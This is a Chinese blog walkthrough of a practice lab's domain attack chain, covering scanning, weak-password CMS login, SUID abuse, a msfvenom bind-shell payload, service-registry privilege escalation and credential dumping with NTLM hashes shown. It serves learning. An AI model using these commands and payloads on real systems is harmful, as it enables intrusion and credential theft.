<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/xxx/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"lvzhouhang.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="lvzhouhang">
<meta property="og:url" content="https://lvzhouhang.xyz/index.html">
<meta property="og:site_name" content="lvzhouhang">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="lvzhouhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://lvzhouhang.xyz/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>lvzhouhang</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

  <!-- 页面点击小红心 -->
  <script type="text/javascript" src="/js/clicklove.js"></script>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lvzhouhang</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/" class="post-title-link" itemprop="url">春秋云镜-Delegation</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-04-18 10:26:30 / 修改时间：15:40:11" itemprop="dateCreated datePublished" datetime="2025-04-18T10:26:30+08:00">2025-04-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>18k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>17 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>首先对靶机进行信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.130.13</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-17 22:29:55] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:22</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:21</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:3306</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:80</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL</span><br><span class="line">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:80 =&gt; [http]</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 加载的插件: ftp, mysql, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-17 22:30:05] [SUCCESS] 网站标题 http://39.99.130.13       状态码:200 长度:68104  标题:中文网页标题</span><br></pre></td></tr></table></figure>

<p>80端口是cmseasy,url后面拼接/admin版本号是v7752,在网上可以查到漏洞</p>
<p><a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>都需要登录后台，弱口令admin:123456登录成功了</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation1.png"></p>
<p>发包然后去访问1.php可以发现写入成功了，写个一句话木马，然后蚁剑连接</p>
<p>flag在/home/flag/下，但是只有root能查看，反弹一个shell准备提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>可以看到diff具有suid权限，可以读取flag01.txt</p>
<h1 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h1><p>还给了一个hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Great job!!!!!!</span><br><span class="line">Here is the hint: WIN19\Adrian</span><br><span class="line">I&#x27;ll do whatever I can to rock you...</span><br></pre></td></tr></table></figure>

<p>上传一个fscan先扫，然后做一个代理隧道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24</span><br><span class="line">./fscan -h 172.22.4.36/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-18 11:04:32] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-18 11:04:32] [INFO] CIDR范围: 172.22.4.0-172.22.4.255</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 生成IP范围: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-18 11:04:32] [INFO] 解析CIDR 172.22.4.36/24 -&gt; IP范围 172.22.4.0-172.22.4.255</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-18 11:04:33] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.7      存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.36     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.45     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.19     存活 (ICMP)</span><br><span class="line">[2025-04-18 11:04:39] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-18 11:04:39] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:80</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:80</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:135</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:139</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:389</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:22</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:21</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:445</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:88</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:3306</span><br><span class="line">[2025-04-18 11:04:39] [SUCCESS] 服务识别 172.22.4.36:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \&gt;; caching_sha2_password]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:80 =&gt; [http]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.19:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.19:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.45:445 =&gt; </span><br><span class="line">[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.7:88 =&gt; </span><br><span class="line">[2025-04-18 11:04:48] [SUCCESS] 服务识别 172.22.4.36:80 =&gt; [http]</span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.7:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.19:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.45:135 =&gt; </span><br><span class="line">[2025-04-18 11:05:44] [INFO] 存活端口数量: 16</span><br><span class="line">[2025-04-18 11:05:44] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-18 11:05:44] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-18 11:05:44] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.45</span><br><span class="line">主机名: WIN19</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.45</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45     XIAORANG\WIN19                </span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.45        状态码:200 长度:703    标题:IIS Windows Server</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.7</span><br><span class="line">主机名: DC01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.7</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.4.19</span><br><span class="line">主机名: FILESERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.4.19</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[2025-04-18 11:05:45] [INFO] 系统信息 172.22.4.7 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.36        状态码:200 长度:68100  标题:中文网页标题</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的flag1给了个提示在WIN19那台机器上存在一个Adrian用户，密码在rockyou里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED</span><br></pre></td></tr></table></figure>

<p>还是得眼尖一点，密码过期他不会告诉你，rdp登录修改密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation2.png"></p>
<p>桌面上有一个PrivescCheck文件夹，PrivescCheck是一个提权的工具，他跑完了留下一个html文件，直接访问就行</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation3.png"></p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation4.png"></p>
<p>给了两个high，第一个WSUS 更多的是被利用来横向移动,第二个注册表，用户对gpupdate具有写、启动、停止的的权限</p>
<p>用msf生成一个正向的木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set LPORT 9999</span><br><span class="line">set RHOST 172.22.4.45</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>将马上传上去然后修改一下注册表手动启动服务</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>

<p>但是这个shell很快就会断开，所以要迁移到另一个进程中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate PID</span><br></pre></td></tr></table></figure>

<p>不知道为什么我的msf shell启动不起来，导出hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain    NTLM                              SHA1</span><br><span class="line">--------  ------    ----                              ----</span><br><span class="line">Adrian    WIN19     4ba5d16eb261eb61148ab5264f457cbb  9a712bd84b09123d36da74d9d5ac255c027588eb</span><br><span class="line">WIN19$    XIAORANG  d41fef724adf6f2ed2cbb5a4ebd186c9  af156e5c6afc93b1a648040bd59f7d5cab23d81a</span><br><span class="line">WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain    Password</span><br><span class="line">--------  ------    --------</span><br><span class="line">(null)    (null)    (null)</span><br><span class="line">Adrian    WIN19     (null)</span><br><span class="line">WIN19$    XIAORANG  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain        Password</span><br><span class="line">--------  ------        --------</span><br><span class="line">(null)    (null)        (null)</span><br><span class="line">Adrian    WIN19         (null)</span><br><span class="line">WIN19$    xiaorang.lab  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25</span><br><span class="line">                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4</span><br><span class="line">                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 